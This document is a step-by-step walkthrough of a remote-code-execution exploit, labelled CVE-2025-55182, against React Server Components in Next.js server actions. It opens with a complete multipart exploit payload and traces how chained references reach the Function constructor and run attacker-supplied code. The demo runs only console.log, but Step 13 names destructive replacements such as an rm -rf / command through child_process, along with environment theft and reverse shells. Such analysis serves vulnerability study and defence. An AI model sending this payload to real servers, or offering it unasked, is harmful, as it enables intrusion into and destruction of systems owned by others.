# React2Shell Payload Walkthrough (CVE-2025-55182)

A step-by-step trace showing exactly how the exploit payload transforms as it flows through the vulnerable code.

---

## The Exploit Payload

```javascript
{
    "0": "$1",
    "1": {
        "status": "resolved_model",
        "reason": 0,
        "_response": "$4",
        "value": "{\"then\":\"$3:map\",\"0\":{\"then\":\"$B3\"},\"length\":1}",
        "then": "$2:then"
    },
    "2": "$@3",
    "3": [],
    "4": {
        "_prefix": "console.log(7*7+1)//",
        "_formData": {
            "get": "$3:constructor:constructor"
        },
        "_chunks": "$2:_response:_chunks"
    }
}
```

---

## Step 1: Request Arrives

### BEFORE (Initial State)

```javascript
// Server state
response._chunks = {}
boundActionArguments = undefined

// Incoming HTTP request
POST /server-action
Content-Type: multipart/form-data
Next-Action: <valid-action-id>

// Form fields (raw strings)
"0" = "$1"
"1" = '{"status":"resolved_model","reason":0,"_response":"$4","value":"{...}","then":"$2:then"}'
"2" = "$@3"
"3" = "[]"
"4" = '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},...}'
```

### CODE

```javascript
// packages/next/src/server/app-render/action-handler.ts:879
boundActionArguments = await decodeReplyFromBusboy(
    busboy,
    serverModuleMap,
    { temporaryReferences }
)
```

### Explanation

The HTTP request arrives with 5 form fields. `decodeReplyFromBusboy` parses each field and stores them as "chunks" in an internal response object. Each chunk starts as a raw string that will be resolved later.

### AFTER

```javascript
// Server state after parsing
response._chunks = {
    0: Chunk { status: "resolved_model", value: "$1", _response: response },
    1: Chunk { status: "resolved_model", value: '{"status":"resolved_model",...}', _response: response },
    2: Chunk { status: "resolved_model", value: "$@3", _response: response },
    3: Chunk { status: "resolved_model", value: "[]", _response: response },
    4: Chunk { status: "resolved_model", value: '{"_prefix":...}', _response: response }
}

// The function returns chunk 0
boundActionArguments = getChunk(response, 0)  // Returns chunk 0, which contains "$1"
```

---

## Step 2: Chunk 0 Resolves → References Chunk 1

### BEFORE

```javascript
// Current resolution target
chunk0.value = "$1"   // <-- This needs to be resolved

// Other chunks (still raw strings)
chunk1.value = '{"status":"resolved_model","_response":"$4","value":"{...}","then":"$2:then"}'
chunk2.value = "$@3"
chunk3.value = "[]"
chunk4.value = '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},...}'
```

### CODE

```javascript
// ReactFlightReplyServer.js - parseModelString
function parseModelString(response, parentObject, key, value) {
    if (value[0] !== '$') return value;

    switch (value[1]) {
        // ... other cases ...
        default: {
            // "$1" → parse "1" as hex → get chunk 1
            const refId = parseInt(value.slice(1), 16);  // refId = 1
            return getOrResolveChunk(response, refId);
        }
    }
}
```

### Explanation

The value `"$1"` starts with `$`, so it's a reference. The character after `$` is `1`, which is parsed as a hexadecimal chunk ID. The function returns chunk 1, which now needs to be resolved.

### AFTER

```javascript
// Chunk 0 now points to chunk 1
chunk0.value = chunk1  // <-- Now references chunk 1 object

// Chunk 1 needs resolution next
chunk1.value = '{"status":"resolved_model","_response":"$4","value":"{...}","then":"$2:then"}'  // <-- Needs parsing
chunk2.value = "$@3"
chunk3.value = "[]"
chunk4.value = '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},...}'
```

---

## Step 3: Chunk 3 Resolves → Empty Array (Gadget Foundation)

### BEFORE

```javascript
chunk0.value = chunk1
chunk1.value = '{"status":"resolved_model","_response":"$4","value":"{...}","then":"$2:then"}'
chunk2.value = "$@3"
chunk3.value = "[]"   // <-- This gets resolved
chunk4.value = '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},...}'
```

### CODE

```javascript
// JSON.parse in resolveField
const parsed = JSON.parse("[]");  // Returns empty array: []
chunk3.value = parsed;
chunk3.status = "initialized";
```

### Explanation

The string `"[]"` is valid JSON. It parses to an empty JavaScript array. This array is critical because it provides access to the prototype chain: `[].constructor` is `Array`, and `Array.constructor` is `Function`.

### AFTER

```javascript
chunk0.value = chunk1
chunk1.value = '{"status":"resolved_model","_response":"$4","value":"{...}","then":"$2:then"}'
chunk2.value = "$@3"
chunk3.value = []     // <-- Now an actual empty array!
chunk3.status = "initialized"
chunk4.value = '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},...}'

// The prototype chain is now accessible:
// [].constructor           → Array
// [].constructor.constructor → Function  ← THIS IS THE RCE GADGET
```

---

## Step 4: Resolving `$3:constructor:constructor` → Gets Function Constructor

### BEFORE

```javascript
chunk0.value = chunk1
chunk1.value = '{"status":"resolved_model","_response":"$4","value":"{...}","then":"$2:then"}'
chunk2.value = "$@3"
chunk3.value = []
chunk3.status = "initialized"
chunk4.value = '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"},...}'
                                                                    ↑
                                            // This reference needs resolution
```

### CODE

```javascript
// ReactFlightReplyServer.js:595 - getOutlinedModel (VULNERABLE!)
function getOutlinedModel(response, reference, parentObject, key, map) {
    const path = reference.split(':');
    // path = ["3", "constructor", "constructor"]

    const id = parseInt(path[0], 16);  // id = 3
    const chunk = getChunk(response, id);

    // ... status checks ...

    let value = chunk.value;  // value = []

    // VULNERABILITY: No validation on property names!
    // This allows traversing the prototype chain
    for (let i = 1; i < path.length; i++) {
        value = value[path[i]];
    }
    // Loop iteration 1: value = []["constructor"]     → Array
    // Loop iteration 2: value = Array["constructor"]  → Function

    return map(response, value);  // Returns Function constructor!
}
```

### Explanation

The reference `"$3:constructor:constructor"` is split by `:` into a path. Starting from chunk 3 (the empty array), the code traverses each property. There's no validation, so it happily walks up the prototype chain to reach `Function` - the constructor that can create functions from strings.

### AFTER

```javascript
chunk0.value = chunk1
chunk1.value = '{"status":"resolved_model","_response":"$4","value":"{...}","then":"$2:then"}'
chunk2.value = "$@3"
chunk3.value = []
chunk3.status = "initialized"
chunk4.value = {
    "_prefix": "console.log(7*7+1)//",
    "_formData": {
        "get": Function  // <-- NOW POINTS TO THE FUNCTION CONSTRUCTOR!
    },
    "_chunks": "$2:_response:_chunks"
}

// chunk4._formData.get is now the Function constructor
// Function("code") creates a new function from a string - like eval()!
```

---

## Step 5: Chunk 2 Resolves → Raw Chunk Reference via `$@`

### BEFORE

```javascript
chunk0.value = chunk1
chunk1.value = '{"status":"resolved_model","_response":"$4","value":"{...}","then":"$2:then"}'
chunk2.value = "$@3"  // <-- This needs resolution
chunk3.value = []
chunk3.status = "initialized"
chunk4._formData.get = Function
```

### CODE

```javascript
// ReactFlightReplyServer.js - parseModelString
function parseModelString(response, parentObject, key, value) {
    switch (value[1]) {
        case '@': {
            // "$@3" → raw chunk reference (not the resolved value!)
            const id = parseInt(value.slice(2), 16);  // id = 3
            const chunk = getChunk(response, id);
            return chunk;  // Returns the Chunk OBJECT, not chunk.value!
        }
    }
}
```

### Explanation

The `$@` prefix is special - it returns the chunk object itself, not its resolved value. Normal `$3` would return `[]` (the resolved value), but `$@3` returns the Chunk wrapper object. This Chunk object has a `then` method (from `Chunk.prototype`), which is key for the next step.

### AFTER

```javascript
chunk0.value = chunk1
chunk1.value = '{"status":"resolved_model","_response":"$4","value":"{...}","then":"$2:then"}'
chunk2.value = Chunk {        // <-- Now holds the Chunk OBJECT for chunk 3
    value: [],
    status: "initialized",
    _response: response,
    then: Chunk.prototype.then  // <-- This is a function!
}
chunk3.value = []
chunk3.status = "initialized"
chunk4._formData.get = Function
```

---

## Step 6: Resolving `$2:then` → Gets Chunk.prototype.then

### BEFORE

```javascript
chunk0.value = chunk1
chunk1.value = '{"status":"resolved_model","_response":"$4","value":"{...}","then":"$2:then"}'
                                                                              ↑
                                                        // This needs resolution
chunk2.value = Chunk { value: [], status: "initialized", then: Chunk.prototype.then }
chunk3.value = []
chunk4._formData.get = Function
```

### CODE

```javascript
// getOutlinedModel processes "$2:then"
const path = reference.split(':');
// path = ["2", "then"]

const id = parseInt(path[0], 16);  // id = 2
const chunk = getChunk(response, id);  // Returns chunk2 (which is the Chunk object from $@3)

let value = chunk.value;  // value = Chunk { ..., then: Chunk.prototype.then }

for (let i = 1; i < path.length; i++) {
    value = value[path[i]];
}
// Loop iteration 1: value = chunk2.value["then"] → Chunk.prototype.then

return value;  // Returns Chunk.prototype.then function!
```

### Explanation

We access the `then` property of chunk 2's value. Since chunk 2 holds a raw Chunk object (from the `$@3` reference), accessing `.then` gives us `Chunk.prototype.then` - the actual Promise-like resolution method.

### AFTER

```javascript
chunk0.value = chunk1
chunk1.value = {
    "status": "resolved_model",
    "reason": 0,
    "_response": "$4",           // Still needs resolution
    "value": "{\"then\":\"$3:map\",\"0\":{\"then\":\"$B3\"},\"length\":1}",
    "then": Chunk.prototype.then  // <-- NOW A FUNCTION!
}
chunk2.value = Chunk { value: [], then: Chunk.prototype.then }
chunk3.value = []
chunk4._formData.get = Function
```

---

## Step 7: Chunk 1 Fully Resolved → Now a Thenable Object

### BEFORE

```javascript
chunk0.value = chunk1
chunk1.value = {
    "status": "resolved_model",
    "reason": 0,
    "_response": "$4",           // <-- Needs resolution
    "value": "{\"then\":\"$3:map\",\"0\":{\"then\":\"$B3\"},\"length\":1}",
    "then": Chunk.prototype.then
}
chunk2.value = Chunk { ... }
chunk3.value = []
chunk4 = { "_prefix": "console.log(7*7+1)//", "_formData": { "get": Function }, ... }
```

### CODE

```javascript
// "$4" resolves to chunk 4
const refId = parseInt("4", 16);  // refId = 4
return getOrResolveChunk(response, refId);  // Returns chunk 4 object
```

### Explanation

The `_response` property resolves to chunk 4 - our fake Response object that contains the malicious code prefix and the Function constructor. Chunk 1 is now fully resolved and has a `then` property that is a function, making it a "thenable" object.

### AFTER

```javascript
chunk0.value = chunk1
chunk1.value = {
    "status": "resolved_model",
    "reason": 0,
    "_response": {                              // <-- Resolved to chunk 4!
        "_prefix": "console.log(7*7+1)//",
        "_formData": { "get": Function },
        "_chunks": ...
    },
    "value": "{\"then\":\"$3:map\",\"0\":{\"then\":\"$B3\"},\"length\":1}",
    "then": Chunk.prototype.then                // <-- This makes it a THENABLE
}
chunk2.value = Chunk { ... }
chunk3.value = []
chunk4._formData.get = Function

// CRITICAL: chunk1 now has a "then" property that is a function
// JavaScript will treat it as a Promise-like object!
```

---

## Step 8: Await Triggers Chunk.prototype.then

### BEFORE

```javascript
// The server code awaits the result
await boundActionArguments  // boundActionArguments points to chunk1

// chunk1 state:
{
    status: "resolved_model",          // <-- This triggers initializeModelChunk
    reason: 0,
    _response: { _prefix: "console.log(7*7+1)//", _formData: { get: Function } },
    value: "{\"then\":\"$3:map\",\"0\":{\"then\":\"$B3\"},\"length\":1}",
    then: Chunk.prototype.then         // <-- JavaScript sees this and calls it
}
```

### CODE

```javascript
// JavaScript Promise resolution detects "then" property
// It calls: chunk1.then(resolve, reject)

// Chunk.prototype.then (ReactFlightReplyServer.js:125)
Chunk.prototype.then = function(resolve, reject) {
    const chunk = this;  // chunk = chunk1 (attacker's object!)

    switch (chunk.status) {
        case "resolved_model":           // chunk1.status matches!
            initializeModelChunk(chunk);  // <-- CALLED WITH ATTACKER DATA
            break;
    }

    switch (chunk.status) {
        case "initialized":
            resolve(chunk.value);  // Resolves with the initialized value
            break;
    }
};
```

### Explanation

When JavaScript `await`s an object with a `then` function, it treats it as a Promise and calls `obj.then(resolve, reject)`. Since `chunk1.then` is `Chunk.prototype.then`, and `chunk1.status` is `"resolved_model"`, it calls `initializeModelChunk(chunk1)` - using the attacker-controlled `chunk1._response`!

### AFTER

```javascript
// initializeModelChunk will be called with:
chunk = {
    status: "resolved_model",
    _response: {                              // ATTACKER CONTROLLED!
        _prefix: "console.log(7*7+1)//",
        _formData: { get: Function }
    },
    value: "{\"then\":\"$3:map\",\"0\":{\"then\":\"$B3\"},\"length\":1}"  // ATTACKER CONTROLLED!
}

// The _response will be used during value resolution
// The value will be JSON.parsed and its references resolved
```

---

## Step 9: initializeModelChunk Parses Nested JSON

### BEFORE

```javascript
// Inside initializeModelChunk, about to parse:
chunk.value = "{\"then\":\"$3:map\",\"0\":{\"then\":\"$B3\"},\"length\":1}"
chunk._response = {
    _prefix: "console.log(7*7+1)//",
    _formData: { get: Function }
}
```

### CODE

```javascript
// ReactFlightReplyServer.js:446 - initializeModelChunk
function initializeModelChunk(chunk) {
    const resolvedModel = chunk.value;
    // = '{"then":"$3:map","0":{"then":"$B3"},"length":1}'

    // Parse the JSON string
    const rawModel = JSON.parse(resolvedModel);
    // = { then: "$3:map", 0: { then: "$B3" }, length: 1 }

    // CRITICAL: reviveModel uses chunk._response for reference resolution!
    const value = reviveModel(
        chunk._response,   // <-- ATTACKER'S FAKE RESPONSE!
        { '': rawModel },
        '',
        rawModel
    );
}
```

### Explanation

The `value` string is parsed as JSON, producing an object with `then`, `0`, and `length` properties. Then `reviveModel` is called to resolve any `$` references in this object - but it uses `chunk._response`, which the attacker controls!

### AFTER

```javascript
// After JSON.parse, we have:
rawModel = {
    "then": "$3:map",     // <-- Needs resolution (will become Array.map)
    "0": {
        "then": "$B3"     // <-- Needs resolution (will trigger RCE!)
    },
    "length": 1           // Makes it array-like
}

// reviveModel will resolve these references using the FAKE response:
response = {
    _prefix: "console.log(7*7+1)//",
    _formData: { get: Function }
}
```

---

## Step 10: Resolving `$3:map` → Gets Array.prototype.map

### BEFORE

```javascript
// Resolving the outer object's "then" property
rawModel = {
    "then": "$3:map",     // <-- Currently resolving this
    "0": { "then": "$B3" },
    "length": 1
}

// Available chunks
chunk3.value = []  // Empty array with access to Array.prototype.map
```

### CODE

```javascript
// getOutlinedModel processes "$3:map"
const path = reference.split(':');
// path = ["3", "map"]

const id = parseInt(path[0], 16);  // id = 3
let value = chunks[3].value;       // value = []

for (let i = 1; i < path.length; i++) {
    value = value[path[i]];
}
// Loop iteration 1: value = []["map"] → Array.prototype.map

return value;  // Returns Array.prototype.map!
```

### Explanation

The path `"3:map"` means "get chunk 3, then access its `map` property". Chunk 3 is an empty array, and arrays have a `map` method. So this resolves to `Array.prototype.map`.

### AFTER

```javascript
// After resolving "$3:map"
rawModel = {
    "then": Array.prototype.map,  // <-- Now a function! Object is THENABLE
    "0": { "then": "$B3" },       // <-- Still needs resolution
    "length": 1
}

// This object is now "thenable" because it has a "then" function
// When JavaScript tries to resolve it, it will call:
//   rawModel.then(resolve, reject)
// Which is actually:
//   Array.prototype.map.call(rawModel, resolve)
```

---

## Step 11: Outer Thenable Resolves → Array.map Iterates

### BEFORE

```javascript
// The resolved outer object
outerObject = {
    then: Array.prototype.map,   // This is the "then" method
    0: { then: "$B3" },          // Item at index 0
    length: 1                    // Array-like length
}

// JavaScript will call: outerObject.then(resolveCallback, rejectCallback)
```

### CODE

```javascript
// JavaScript Promise resolution calls:
outerObject.then(resolveCallback, rejectCallback)

// Since outerObject.then = Array.prototype.map, this becomes:
Array.prototype.map.call(outerObject, resolveCallback)

// Array.map sees outerObject as array-like: { 0: {...}, length: 1 }
// It iterates over indices 0 through length-1:
for (let i = 0; i < outerObject.length; i++) {
    const item = outerObject[i];        // item = { then: "$B3" }
    resolveCallback(item, i, outerObject);  // Tries to resolve item
}
```

### Explanation

When JavaScript sees an object with a `then` function, it calls it. Here, `then` is `Array.map`, so it iterates over the object as if it were an array. For each item, it calls the resolve callback - which will try to resolve `{then: "$B3"}` as another thenable.

### AFTER

```javascript
// Array.map found one item at index 0:
innerObject = { then: "$B3" }  // <-- This needs resolution

// The "$B3" reference must be resolved before this object can be used
// This is where the RCE happens!
```

---

## Step 12: Resolving `$B3` → THE RCE TRIGGER!

### BEFORE

```javascript
// Currently resolving:
innerObject = { then: "$B3" }  // <-- "$B3" needs resolution
                    ↑
                    // $B = Blob handler, 3 = blob ID

// The response object being used (ATTACKER CONTROLLED):
response = {
    _prefix: "console.log(7*7+1)//",
    _formData: { get: Function }   // Function constructor!
}
```

### CODE

```javascript
// ReactFlightReplyServer.js - parseModelString
function parseModelString(response, parentObject, key, value) {
    switch (value[1]) {
        case 'B': {
            // "$B3" → Blob reference
            const id = parseInt(value.slice(2), 16);
            // id = 3

            const prefix = response._prefix;
            // prefix = "console.log(7*7+1)//"   ← ATTACKER'S CODE!

            const blobKey = prefix + id;
            // blobKey = "console.log(7*7+1)//" + "3"
            // blobKey = "console.log(7*7+1)//3"

            return response._formData.get(blobKey);
            // response._formData.get = Function   ← FUNCTION CONSTRUCTOR!
            //
            // This becomes: Function("console.log(7*7+1)//3")
            //
            // Which creates:
            // function anonymous() {
            //     console.log(7*7+1)//3
            // }
        }
    }
}
```

### Explanation

The `$B` prefix triggers the Blob handler. Normally it would look up a blob by constructing a key from `_prefix` + id. But the attacker controls `response._prefix` (the malicious code) and `response._formData.get` (the Function constructor). So instead of looking up a blob, it calls `Function("malicious code")` which creates an executable function!

The `//` at the end of the prefix is a JavaScript comment that hides the appended ID (`3`), so the code remains valid.

### AFTER

```javascript
// The "$B3" reference resolved to a malicious function:
innerObject = {
    then: function anonymous() {
        console.log(7*7+1)//3
    }
}

// This object now has a "then" property that is a FUNCTION
// JavaScript will treat it as a thenable and CALL the function!
```

---

## Step 13: Inner Thenable Resolves → CODE EXECUTION!

### BEFORE

```javascript
// The inner object is now:
innerObject = {
    then: function anonymous() {
        console.log(7*7+1)//3   // Malicious code
    }
}

// JavaScript sees this as a thenable (has "then" function)
// It will call: innerObject.then(resolve, reject)
```

### CODE

```javascript
// JavaScript Promise resolution:
innerObject.then(resolve, reject)

// This CALLS the malicious function:
(function anonymous() {
    console.log(7*7+1)//3
})(resolve, reject)

// The function executes!
// console.log(7*7+1) → console.log(50) → prints "50"
// //3 is just a comment, ignored
```

### Explanation

When JavaScript tries to resolve the inner thenable, it calls `innerObject.then()`. But `then` is our malicious function! The function executes with `resolve` and `reject` as arguments (which it ignores), and runs `console.log(7*7+1)`.

### AFTER

```javascript
// RESULT:
// Server console output: 50

// The attacker achieved Remote Code Execution!
// They can replace "console.log(7*7+1)" with any code:
//   - require('child_process').exec('rm -rf /')
//   - Read environment variables
//   - Access the filesystem
//   - Establish reverse shells
//   - Anything Node.js can do!
```

---

## Complete Payload Transformation Summary

### Initial Payload (Strings)

```javascript
{
    "0": "$1",
    "1": '{"status":"resolved_model","_response":"$4","value":"{...}","then":"$2:then"}',
    "2": "$@3",
    "3": "[]",
    "4": '{"_prefix":"console.log(7*7+1)//","_formData":{"get":"$3:constructor:constructor"}}'
}
```

### After Resolution (Objects)

```javascript
{
    "0": → chunk1,
    "1": {
        status: "resolved_model",
        _response: chunk4,              // Fake Response
        value: "{...}",                 // Nested payload
        then: Chunk.prototype.then      // Makes chunk1 thenable
    },
    "2": Chunk { value: [], then: Chunk.prototype.then },
    "3": [],                            // Gadget array
    "4": {
        _prefix: "console.log(7*7+1)//", // Malicious code
        _formData: { get: Function }     // RCE gadget
    }
}
```

### Execution Chain

```
await boundActionArguments
       ↓
chunk1.then() called
       ↓ (status = "resolved_model")
initializeModelChunk(chunk1)
       ↓ (uses chunk1._response = FAKE)
JSON.parse(chunk1.value)
       ↓
{ then: "$3:map", 0: { then: "$B3" }, length: 1 }
       ↓ (resolve "$3:map")
{ then: Array.map, 0: { then: "$B3" }, length: 1 }
       ↓ (thenable.then() = Array.map.call(...))
Array.map iterates, finds { then: "$B3" }
       ↓ (resolve "$B3" with FAKE response)
FAKE._formData.get(FAKE._prefix + "3")
       ↓
Function("console.log(7*7+1)//3")
       ↓
{ then: function() { console.log(7*7+1)//3 } }
       ↓ (thenable.then() called)
function EXECUTES!
       ↓
╔═══════════════════════════════════╗
║  console.log(50) → RCE ACHIEVED!  ║
╚═══════════════════════════════════╝
```

---

## Quick Reference

### What Each Chunk Does

| Chunk | Initial Value | Resolves To | Purpose |
|-------|--------------|-------------|---------|
| `0` | `"$1"` | chunk1 | Entry point |
| `1` | `{status, _response, value, then}` | Thenable with fake response | Triggers initializeModelChunk |
| `2` | `"$@3"` | Raw Chunk object | Provides access to Chunk.prototype.then |
| `3` | `"[]"` | `[]` | Prototype chain to Function |
| `4` | `{_prefix, _formData}` | Fake Response | Contains malicious code + Function constructor |

### Key Symbols

| Symbol | Meaning | Example |
|--------|---------|---------|
| `$N` | Reference chunk N's value | `$1` → chunk1.value |
| `$@N` | Reference chunk N itself (raw) | `$@3` → Chunk object |
| `$BN` | Blob reference (triggers Blob handler) | `$B3` → RCE trigger |
| `X:Y:Z` | Property traversal | `3:constructor:constructor` → Function |
